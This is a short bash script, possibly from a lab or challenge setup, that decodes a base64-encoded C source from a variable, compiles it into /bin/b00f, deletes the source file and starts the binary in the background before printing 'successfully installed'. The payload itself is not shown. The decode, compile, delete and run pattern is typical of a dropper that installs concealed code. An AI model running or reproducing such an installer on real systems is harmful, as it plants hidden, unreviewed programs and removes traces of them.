#!/bin/bash
    
base64 -d <<< $BASE_64_STRING > /tmp/b00f.c
gcc -o /bin/b00f /tmp/b00f.c
rm -f /tmp/b00f.c
/bin/b00f & 
    
echo "successfully installed"
exit 